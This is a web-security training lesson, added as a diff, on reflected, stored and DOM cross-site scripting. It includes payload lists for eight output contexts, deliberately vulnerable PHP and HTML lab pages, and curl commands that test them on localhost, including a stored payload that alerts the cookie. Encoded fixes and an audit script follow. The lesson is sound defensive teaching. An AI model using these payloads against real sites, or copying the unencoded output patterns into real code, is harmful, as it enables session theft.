@@ -1,0 +1,430 @@
+<h1 id="cross-site-scripting-and-dom-xss">Cross-Site Scripting and DOM XSS</h1>
+<h2 id="summary">Summary</h2>
+<p>XSS is <code>ps-01</code>'s model with the roles reversed: the <em>server</em> produces a string containing your<br />
+data, and the <em>browser's</em> parser treats it as markup. The bug is a disagreement between what<br />
+the server meant and what the browser did.</p>
+<p>The critical insight from PortSwigger's framing is that <strong>the output context determines the<br />
+defence</strong>. <code>&lt;script&gt;</code> is the vulnerability everyone looks for; it is one of at least eight.</p>
+<h2 id="the-three-types">The three types</h2>
+<pre><code class="language-text">  REFLECTED   your input comes back in the response to your own request
+              -&gt; needs a victim to click a crafted link
+              -&gt; phishing-grade, easy to spot, usually patched first
+
+  STORED      your input is saved and served to OTHER users
+              -&gt; no victim interaction needed beyond visiting the page
+              -&gt; session theft at scale, worms (Samy), defacement
+              -&gt; the highest severity of the three
+
+  DOM         the payload never reaches the server; it executes in JS
+              -&gt; source and sink are both in the page
+              -&gt; invisible to server-side WAFs and to server logs
+              -&gt; needs `document.write`/innerHTML/`eval`/location
+</code></pre>
+<h2 id="output-context-is-the-whole-game">Output context is the whole game</h2>
+<pre><code class="language-html">&lt;!-- 1. HTML BODY --&gt;
+&lt;p&gt;search for: $q&lt;/p&gt;
+   payload: &lt;script&gt;alert(1)&lt;/script&gt;
+
+&lt;!-- 2. HTML ATTRIBUTE --&gt;
+&lt;a href=&quot;/x?q=$q&quot;&gt;click&lt;/a&gt;
+   payload: &quot; onmouseover=&quot;alert(1)      -&gt; escapes the attribute, adds a handler
+   payload: &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;  -&gt; closes the tag entirely
+
+&lt;!-- 3. UNQUOTED ATTRIBUTE --&gt;
+&lt;div class=$q&gt;
+   payload: x onmouseover=alert(1)       -&gt; a space is all you need
+
+&lt;!-- 4. JAVASCRIPT STRING --&gt;
+&lt;script&gt;var q = &quot;$q&quot;;&lt;/script&gt;
+   payload: &quot;;alert(1);//               -&gt; escapes the string literal
+
+&lt;!-- 5. JAVASCRIPT BLOCK --&gt;
+&lt;script&gt;var n = $q;&lt;/script&gt;            -&gt; no quotes at all
+   payload: 1;alert(1)
+
+&lt;!-- 6. URL PARAMETER --&gt;
+&lt;a href=&quot;/redirect?next=$q&quot;&gt;go&lt;/a&gt;
+   payload: javascript:alert(1)
+   -&gt; ONLY fires if the user clicks. Not &quot;XSS&quot; in most definitions.
+
+&lt;!-- 7. CSS --&gt;
+&lt;style&gt; .x { background: url($q); } &lt;/style&gt;
+   payload: ); }          -&gt; breaks out; or a javascript: URL in some engines
+
+&lt;!-- 8. HTTP HEADER / PDF / anything reflected**
+   Location: $q            -&gt; CRLF injection, open redirect, not script
+</code></pre>
+<p><strong>If your payload "does not work", you are almost certainly in the wrong<br />
+context.</strong> Changing <code>&lt;script&gt;</code> to <code>"&gt;&lt;img src=x onerror=alert(1)&gt;</code> moves<br />
+you from context 1 to context 2.</p>
+<h2 id="the-payload-ladder">The payload ladder</h2>
+<pre><code class="language-text">  1. &lt;script&gt;alert(1)&lt;/script&gt;          does a &lt;script&gt; tag run here?
+  2. &lt;img src=x onerror=alert(1)&gt;        any tag? any event handler?
+  3. &lt;svg onload=alert(1)&gt;               different parser, different result
+  4. &quot;&gt;&lt;img src=x onerror=alert(1)&gt;     in an attribute?
+  5. javascript:alert(1)                in an href/src?
+  6. &lt;body onload=alert(1)&gt;             no allowed tags, but onload?
+  7. */&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;  escaping a JS string comment
+  8. {{constructor.constructor('alert(1)')()}}   template/DOM prototype
+</code></pre>
+<p>Try them in order. Each one is a different assumption about what the<br />
+parser permits.</p>
+<h2 id="dom-xss-source-and-sink">DOM XSS: source and sink</h2>
+<pre><code class="language-text">  SOURCE (where attacker data enters JS)
+    location.hash / location.search / location.href / document.referrer
+    document.URL / document.documentURI / document.baseURI
+    document.cookie / localStorage / sessionStorage / IndexedDB
+    postMessage events
+    fetch/XHR response data
+    form input values
+
+  SINK (where it becomes code)
+    eval() / new Function() / setTimeout(string) / setInterval(string)
+    innerHTML / outerHTML / insertAdjacentHTML / document.write
+    jQuery .html() .append() .prepend() .after() .before()
+    React dangerouslySetInnerHTML
+    element.setAttribute('href'|'src'|'on*', value)   -&gt; javascript: URL
+    location = value / location.assign(value) / location.replace(value)
+
+  THE RULE: NEVER pass attacker-influenceable data to a sink. Not
+  escaped, not filtered, not &quot;it's fine because it's same-origin&quot;.
+  innerHTML does not execute &lt;script&gt;, but it DOES execute
+  &lt;img onerror=...&gt;, which is exactly as good for you.
+</code></pre>
+<pre><code class="language-html">&lt;!-- the canonical DOM XSS, on purpose --&gt;
+&lt;button onclick=&quot;location = getParameter('next')&quot;&gt;go&lt;/button&gt;
+&lt;script&gt;
+  function getParameter(name) {
+    return decodeURIComponent(
+      new RegExp('[?&amp;]' + name + '=([^&amp;]*)').exec(location.search)[1]);
+  }
+&lt;/script&gt;
+</code></pre>
+<p><code>?next=javascript:alert(1)</code> then clicking "go" executes. No server<br />
+involvement, no server log, no server-side filter sees it.</p>
+<h2 id="what-actually-stops-it">What actually stops it</h2>
+<pre><code class="language-text">  PRIMARY: encode on output, per context. The server must know the context
+           and encode for it. context-aware output encoding is the fix.
+
+  SECONDARY, and necessary anyway:
+    - CSP, to reduce the impact of anything that slips through
+    - HttpOnly cookies, so a stolen XSS cannot read the session
+    - SameSite, so it cannot be used cross-site
+    - a response header, so it cannot be used cross-origin
+
+  WHAT DOES NOT WORK:
+    - input validation / filtering (blacklists are bypassed forever)
+    - &lt;script&gt;alert&lt;/script&gt;            (contexts 2-7 still work)
+    - strip &lt; and &gt; only                (attribute and JS contexts survive)
+    - HTML entities once, at input time (wrong layer, wrong contexts)
+    - regex /&lt;.*&gt;/                     (attribute contexts, case, spacing)
+</code></pre>
+<p><strong>Encoding at input time is a classic mistake.</strong> By the time the value<br />
+reaches output it may be in a different context. Encode at output, in the<br />
+context, and know which context that is.</p>
+<h2 id="csp-honestly">CSP, honestly</h2>
+<pre><code>  Content-Security-Policy: default-src 'self'
+</code></pre>
+<pre><code class="language-text">  WHAT IT ACTUALLY DOES: it restricts where resources may come from and
+  whether inline script may run. With 'unsafe-inline' absent, an injected
+  &lt;script&gt; does not execute.
+
+  WHAT IT DOES NOT DO:
+    - it does not stop the injection
+    - it does not stop exfiltration via allowed destinations
+    - it is bypassable in real deployments via
+        * a nonce or hash that is predictable/leaked
+        * JSONP endpoints on the same origin
+        * open redirect to an allowed origin
+        * 'strict-dynamic' combined with a reachable trusted script
+        * base-uri / form-action being unrestricted
+
+  USE IT, but as defence in depth behind output encoding, not instead of it.
+</code></pre>
+<h2 id="terminology">Terminology</h2>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>XSS</strong></td>
+<td>Script executing in a trusted origin</td>
+</tr>
+<tr>
+<td><strong>Reflected XSS</strong></td>
+<td>Comes back in your own response</td>
+</tr>
+<tr>
+<td><strong>Stored XSS</strong></td>
+<td>Saved and served to others; highest severity</td>
+</tr>
+<tr>
+<td><strong>DOM XSS</strong></td>
+<td>Source and sink both client-side; invisible to the server</td>
+</tr>
+<tr>
+<td><strong>Source</strong></td>
+<td>Where attacker data enters JS</td>
+</tr>
+<tr>
+<td><strong>Sink</strong></td>
+<td>Where it becomes code</td>
+</tr>
+<tr>
+<td><strong>Output context</strong></td>
+<td>HTML body, attribute, JS, URL, CSS — determines the payload</td>
+</tr>
+<tr>
+<td><strong>Context-aware encoding</strong></td>
+<td>Encode for the specific context</td>
+</tr>
+<tr>
+<td><strong>HTML entity encoding</strong></td>
+<td><code>&amp; &lt; &gt; " '</code> → entities; for HTML contexts</td>
+</tr>
+<tr>
+<td><strong>JS escaping</strong></td>
+<td>Backslash/unicode escapes; for JS string contexts</td>
+</tr>
+<tr>
+<td><strong>URL encoding</strong></td>
+<td>Percent-encoding; for URL contexts</td>
+</tr>
+<tr>
+<td><strong>CSP</strong></td>
+<td>Content-Security-Policy header</td>
+</tr>
+<tr>
+<td><strong><code>dangerouslySetInnerHTML</code></strong></td>
+<td>React's deliberate XSS hole</td>
+</tr>
+<tr>
+<td><strong>Sanitizer</strong></td>
+<td>A library that <em>removes</em> rather than encodes</td>
+</tr>
+<tr>
+<td><strong>HttpOnly</strong></td>
+<td>Cookie flag; JS cannot read the session</td>
+</tr>
+</tbody>
+</table>
+<h2 id="kali-commands">Kali commands</h2>
+<pre><code class="language-bash">mkdir -p ~/aegis/labs/ps-03 &amp;&amp; cd ~/aegis/labs/ps-03
+
+# --- 1. a deliberately vulnerable endpoint, in eight contexts ---
+cat &gt; contexts.php &lt;&lt;'PHP'
+&lt;?php
+// Eight output contexts. Each line is a different vulnerability with a
+// different fix. This is the file that makes the lesson concrete.
+$q = $_GET['q'] ?? '';
+$attr = $_GET['a'] ?? '';
+$js   = $_GET['j'] ?? '';
+header('Content-Type: text/html; charset=utf-8');
+echo &quot;&lt;!doctype html&gt;&lt;title&gt;ps-03 contexts&lt;/title&gt;&lt;h1&gt;ps-03 contexts&lt;/h1&gt;&quot;;
+echo &quot;&lt;p&gt;q = &quot; . $q . &quot;&lt;/p&gt;&quot;;                                   // 1 HTML body
+echo &quot;&lt;p&gt;&lt;a href='/x?q=&quot; . $q . &quot;'&gt;link&lt;/a&gt;&lt;/p&gt;&quot;;               // 2 quoted attribute
+echo &quot;&lt;p&gt;&lt;a href='/x?q=&quot; . $attr . &quot;'&gt;attr&lt;/a&gt;&lt;/p&gt;&quot;;            // 2b via separate param
+echo &quot;&lt;div class=&quot; . $attr . &quot;&gt;unquoted&lt;/div&gt;&quot;;                  // 3 unquoted attribute
+echo &quot;&lt;script&gt;var j = \&quot;$js\&quot;;&lt;/script&gt;&quot;;                       // 4 JS string
+echo &quot;&lt;script&gt;var n = $q;&lt;/script&gt;&quot;;                            // 5 JS block
+echo &quot;&lt;p&gt;&lt;a href=\&quot;$q\&quot;&gt;url&lt;/a&gt;&lt;/p&gt;&quot;;                            // 6 URL
+PHP
+
+cat &gt; dom.html &lt;&lt;'HTML'
+&lt;!doctype html&gt;&lt;meta charset=utf-8&gt;&lt;title&gt;ps-03 DOM&lt;/title&gt;
+&lt;h1&gt;DOM XSS&lt;/h1&gt;
+&lt;button id=&quot;go&quot;&gt;go&lt;/button&gt;
+&lt;p id=&quot;out&quot;&gt;&lt;/p&gt;
+&lt;script&gt;
+// SOURCE: location.search.  SINK: innerHTML.
+const p = new URLSearchParams(location.search);
+const next = p.get('next') || '';
+document.getElementById('out').innerHTML = 'redirecting to: ' + next;
+// Try:  index.html?next=&lt;img src=x onerror=alert(document.domain)&gt;
+//
+// Also present, and worth knowing:
+//   location = next            -&gt; javascript: URLs execute
+//   eval(next)                 -&gt; direct code execution
+//   new Function(next)()       -&gt; ditto
+&lt;/script&gt;
+HTML
+
+cat &gt; stored.php &lt;&lt;'PHP'
+&lt;?php
+// STORED xss: one person's input is served to everyone else.
+session_start();
+$db = new PDO('sqlite:' . __DIR__ . '/x.db');
+$db-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+$db-&gt;exec(&quot;CREATE TABLE IF NOT EXISTS posts (id INTEGER PRIMARY KEY,
+           body TEXT, posted_by TEXT)&quot;);
+if (($_POST['body'] ?? '') !== '') {
+  $db-&gt;prepare(&quot;INSERT INTO posts (body, posted_by) VALUES (?,?)&quot;)
+     -&gt;execute([$_POST['body'], $_SESSION['who'] ?? 'anonymous']);
+}
+header('Content-Type: text/html; charset=utf-8');
+echo &quot;&lt;h1&gt;guestbook&lt;/h1&gt;&quot;;
+echo &quot;&lt;p&gt;posting as: &quot; . htmlspecialchars($_SESSION['who'] ?? 'anonymous') . &quot;&lt;/p&gt;&quot;;
+echo &quot;&lt;form method=post&gt;&lt;input name=body placeholder=say something&gt;&lt;button&gt;post&lt;/button&gt;&lt;/form&gt;&quot;;
+foreach ($db-&gt;query(&quot;SELECT * FROM posts&quot;) as $r) {
+  // THE BUG: the stored value is echoed with NO encoding. Everyone who
+  // loads this page - including a victim with a session - executes it.
+  echo &quot;&lt;div class=post&gt;&lt;b&gt;&quot; . htmlspecialchars($r['posted_by']) . &quot;&lt;/b&gt;: &quot;
+     . $r['body'] . &quot;&lt;/div&gt;\n&quot;;        // &lt;-- unencoded
+}
+PHP
+
+nohup php -S 127.0.0.1:8080 -t . &gt; php.log 2&gt;&amp;1 &amp;
+sleep 1
+
+# --- 2. work the ladder against each context ---
+{
+  echo &quot;=== CONTEXT 1: HTML body ===&quot;
+  for p in '&lt;script&gt;alert(1)&lt;/script&gt;' '&lt;img src=x onerror=alert(1)&gt;' '&lt;svg onload=alert(1)&gt;'; do
+    printf &quot;  %-34s %s\n&quot; &quot;$p&quot; &quot;$(curl -s --get --data-urlencode &quot;q=$p&quot; http://127.0.0.1:8080/contexts.php | grep -qF &quot;$p&quot; &amp;&amp; echo 'REFLECTED VERBATIM')&quot;
+  done
+  echo
+  echo &quot;=== CONTEXT 3: unquoted attribute ===&quot;
+  for p in '&quot; onmouseover=&quot;alert(1)' 'x onmouseover=alert(1)' '&gt;&lt;img src=x onerror=alert(1)&gt;'; do
+    printf &quot;  %-34s %s\n&quot; &quot;$p&quot; &quot;$(curl -s --get --data-urlencode &quot;a=$p&quot; http://127.0.0.1:8080/contexts.php | grep -qF &quot;$p&quot; &amp;&amp; echo 'REFLECTED VERBATIM')&quot;
+  done
+  echo &quot;  note: &lt;script&gt; does NOT work here. It is the wrong context.&quot;
+  echo &quot;  the first payload that works here is '\&quot; onmouseover=\&quot;...'&quot;
+  echo
+  echo &quot;=== CONTEXT 4: JavaScript string ===&quot;
+  for p in '&quot;;alert(1);//' '&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;' '\\\\'; do
+    printf &quot;  %-40s %s\n&quot; &quot;$p&quot; &quot;$(curl -s --get --data-urlencode &quot;j=$p&quot; http://127.0.0.1:8080/contexts.php | grep -qF &quot;$p&quot; &amp;&amp; echo 'REFLECTED')&quot;
+  done
+  echo
+  echo &quot;=== CONTEXT 6: URL ===&quot;
+  for p in 'javascript:alert(1)' 'data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;'; do
+    printf &quot;  %-42s %s\n&quot; &quot;$p&quot; &quot;$(curl -s --get --data-urlencode &quot;q=$p&quot; http://127.0.0.1:8080/contexts.php | grep -qF &quot;$p&quot; &amp;&amp; echo 'REFLECTED')&quot;
+  done
+  echo
+  echo &quot;=== THE LADDER, in order ===&quot;
+  echo &quot;  1 &lt;script&gt;alert(1)&lt;/script&gt;      works in context 1 only&quot;
+  echo &quot;  2 &lt;img src=x onerror=alert(1)&gt;    works in 1, 2, 3&quot;
+  echo &quot;  3 &lt;svg onload=alert(1)&gt;          works in 1&quot;
+  echo &quot;  4 \&quot;&gt;&lt;img src=x onerror=alert(1)&gt; works in 2&quot;
+  echo &quot;  5 javascript:alert(1)            works in 6, on click&quot;
+  echo &quot;  6 &lt;body onload=alert(1)&gt;         works in 1&quot;
+} 2&gt;&amp;1 | tee 01-ladder.txt
+
+# --- 3. stored XSS: prove the cross-user impact ---
+{
+  echo &quot;=== attacker posts ===&quot;
+  curl -s -X POST --data-urlencode 'body=&lt;img src=x onerror=alert(document.cookie)&gt;' \
+    http://127.0.0.1:8080/stored.php -c cookies.txt &gt; /dev/null
+  echo &quot;  posted by 'anonymous'. Now any OTHER visitor gets it executed.&quot;
+  echo
+  echo &quot;=== what a victim receives, as bytes ===&quot;
+  curl -s http://127.0.0.1:8080/stored.php | grep -A1 &quot;guestbook&quot; | tail -2 | sed 's/^/  /'
+  echo
+  echo &quot;=== and with a cookie set, so you can see what would be stolen ===&quot;
+  curl -s -b 'session=abc123' http://127.0.0.1:8080/stored.php | grep -c &quot;onerror&quot; | xargs echo &quot;  onerror handlers served:&quot;
+  echo
+  echo &quot;  THE POINT: stored XSS needs no victim interaction. Visiting a page&quot;
+  echo &quot;  is enough. If that page sets a session cookie without HttpOnly,&quot;
+  echo &quot;  the payload steals it and the attacker replays it.&quot;
+  echo
+  echo &quot;  (In the real world this is how account takeover happens on sites&quot;
+  echo &quot;   with a comments field, a profile bio, or a filename.)&quot;
+} 2&gt;&amp;1 | tee 02-stored.txt
+
+# --- 4. the fix, per context ---
+cat &gt; 03-fix.php &lt;&lt;'PHP'
+&lt;?php
+// The same eight contexts, correctly encoded. Compare line by line.
+function e_html($s)  { return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); }
+function e_attr($s)  { return e_html($s); }
+function e_js($s)    { return json_encode($s, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT); }
+function e_url($s)   { return rawurlencode($s); }
+
+$q    = $_GET['q'] ?? '';
+$attr = $_GET['a'] ?? '';
+$js   = $_GET['j'] ?? '';
+header('Content-Type: text/html; charset=utf-8');
+echo &quot;&lt;p&gt;q = &quot;     . e_html($q)  . &quot;&lt;/p&gt;&quot;;                          // 1
+echo &quot;&lt;a href='/x?q=&quot; . e_attr($q) . &quot;'&gt;link&lt;/a&gt;&quot;;                 // 2
+echo &quot;&lt;div class=\&quot;&quot; . e_attr($attr) . &quot;\&quot;&gt;quoted&lt;/div&gt;&quot;;          // 3
+echo &quot;&lt;script&gt;var j = &quot; . e_js($js) . &quot;;&lt;/script&gt;&quot;;                // 4
+echo &quot;&lt;a href=\&quot;/go?to=&quot; . e_url($q) . &quot;\&quot;&gt;url&lt;/a&gt;&quot;;               // 6
+
+// AND: a CSP that would have limited the damage anyway
+header('Content-Security-Policy: default-src \'self\'; script-src \'self\'');
+PHP
+{
+  echo &quot;=== the fixed version's output for the same payloads ===&quot;
+  nohup php -S 127.0.0.1:8090 -t . &gt; php2.log 2&gt;&amp;1 &amp;
+  sleep 1
+  for p in '&lt;script&gt;alert(1)&lt;/script&gt;' '&quot;&gt;&lt;img src=x onerror=alert(1)&gt;'; do
+    echo &quot;  payload: $p&quot;
+    curl -s --get --data-urlencode &quot;q=$p&quot; http://127.0.0.1:8090/03-fix.php | grep -E &quot;^&lt;p|^&lt;a&quot; | head -2 | sed 's/^/    /'
+  done
+  echo
+  echo &quot;  Note e_js uses json_encode with HEX flags, not addslashes.&quot;
+  echo &quot;  addslashes is not JavaScript escaping - it produces invalid JS&quot;
+  echo &quot;  for backslashes, quotes AND newlines, and gets it wrong.&quot;
+  echo
+  echo &quot;  And note the CSP header on the fixed version. Encoding is the&quot;
+  echo &quot;  fix; CSP is what limits the blast radius if something slips.&quot;
+} 2&gt;&amp;1 | tee 04-fixed.txt
+
+# --- 5. audit: find unencoded output without a source review ---
+cat &gt; 05-audit.sh &lt;&lt;'EOF'
+#!/usr/bin/env bash
+echo &quot;=== 1. every output of user input ===&quot;
+grep -rnE 'echo|print|printf|innerHTML|document\.write|\.html\(|dangerouslySetInnerHTML' \
+     --include=&quot;*.php&quot; --include=&quot;*.js&quot; . | grep -E '\$_(GET|POST|REQUEST|COOKIE)' | head -20
+
+echo; echo &quot;=== 2. outputs with NO encoding function in the line ===&quot;
+# This is the finding: an echo of user input that is not wrapped in an encoder
+grep -rnE '(echo|print)\s+.*\$_' --include=&quot;*.php&quot; . \
+  | grep -vE 'htmlspecialchars|htmlentities|urlencode|intval|json_encode' | sed 's/^/  /'
+
+echo; echo &quot;=== 3. DOM sinks in JavaScript ===&quot;
+grep -rnE 'innerHTML|outerHTML|insertAdjacentHTML|document\.write|eval\(|new Function|setTimeout\([&quot;'\'']' \
+     --include=&quot;*.js&quot; --include=&quot;*.html&quot; . | sed 's/^/  /'
+
+echo; echo &quot;=== 4. DOM sources reaching a sink (the pairing that matters) ===&quot;
+grep -rnE 'location\.(search|hash|href)|document\.(URL|referrer|cookie)|URLSearchParams' \
+     --include=&quot;*.js&quot; --include=&quot;*.html&quot; . | sed 's/^/  /'
+
+echo; echo &quot;=== 5. headers that should be present ===&quot;
+for h in content-security-policy x-content-type-options; do
+  v=$(curl -sI --max-time 3 http://127.0.0.1:8080/contexts.php 2&gt;/dev/null | grep -i &quot;^$h&quot; | head -1)
+  printf &quot;  %-26s %s\n&quot; &quot;$h&quot; &quot;${v:-ABSENT}&quot;
+done
+c=$(curl -sI --max-time 3 http://127.0.0.1:8080/stored.php 2&gt;/dev/null | grep -i set-cookie | head -1)
+echo &quot;  set-cookie on a session   ${c:-none}&quot;
+echo &quot;  ^ no HttpOnly on that cookie means stored XSS steals the session.&quot;
+EOF
+chmod +x 05-audit.sh
+./05-audit.sh 2&gt;&amp;1 | tee 06-audit.txt
+rm -f cookies.txt
+</code></pre>
+<p><strong>Step 2 is the deliverable</strong>: the same payload tried against eight contexts, with the result<br />
+recorded per context. <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> works in context 1 and nowhere else; the<br />
+quote-break works only in the attribute contexts. That table is why "my XSS payload doesn't<br />
+work" is nearly always a context problem, not a filter problem.</p>
+<p><strong>Step 4</strong> shows <code>json_encode</code> with HEX flags for JS contexts rather than <code>addslashes</code>, which<br />
+is a genuinely common and genuinely wrong fix.</p>
+<p><strong>Record:</strong> <code>01-ladder.txt</code> and <code>06-audit.txt</code>.</p>
+<h2 id="self-test">Self-test</h2>
+<ol>
+<li>What distinguishes reflected, stored and DOM XSS in severity and in reachability?</li>
+<li>Name six output contexts and the payload shape each needs.</li>
+<li>Why does <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> fail in an unquoted attribute?</li>
+<li>Name four DOM sources and four DOM sinks.</li>
+<li>Why is encoding at input time the wrong layer?</li>
+<li>Why is <code>addslashes</code> not JavaScript escaping?</li>
+<li>What does CSP stop, and what does it not?</li>
+<li>Which cookie flag prevents XSS from stealing the session, and why is it not enough alone?</li>
+</ol>
+<h2 id="connected-knowledge">Connected knowledge</h2>
+<p><strong>XSS</strong> → <strong>HTML Injection</strong> → <strong>Sanitization</strong> → <strong>CSP</strong> → <strong>Same-Origin Policy</strong> →<br />
+<strong>Session Fixation</strong>.<br />
+<code>ps-07</code> covers the cookie flag that limits what XSS can steal.</p>
